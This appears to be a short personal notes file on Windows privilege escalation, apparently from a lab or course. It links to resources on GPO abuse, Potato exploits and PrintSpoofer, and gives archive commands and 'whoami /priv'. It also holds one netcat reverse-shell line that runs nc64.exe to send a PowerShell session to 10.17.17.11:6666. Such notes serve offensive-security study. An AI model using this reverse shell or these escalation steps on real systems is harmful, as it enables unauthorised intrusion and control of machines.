# privileges
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-sharpgpoabuse](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#abuse-gpo-with-sharpgpoabuse)

`Start-Process -FilePath "C:\enterprise-share\nc64.exe" -ArgumentList "-nv 10.17.17.11 6666 -e powershell.exe"`

for compressing files or folders from windows terminal

```text-plain
Compress-Archive -Path C:\Users\winbu\Music\Benny Goodman Swings Again\*.mp3 -DestinationPath C:\Users\winbu\Music\favorite music.zip
```

```text-plain
Expand-Archive -LiteralPath sharp.zip -DestinationPath gposharp
```

`whoami /priv`

[https://jlajara.gitlab.io/others/2020/11/22/Potatoes\_Windows\_Privesc.html](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html) 

For SeImPersonate: 

[https://github.com/itm4n/PrintSpoofer/releases](https://github.com/itm4n/PrintSpoofer/releases)  binaries

![](privileges/printspoofer.png)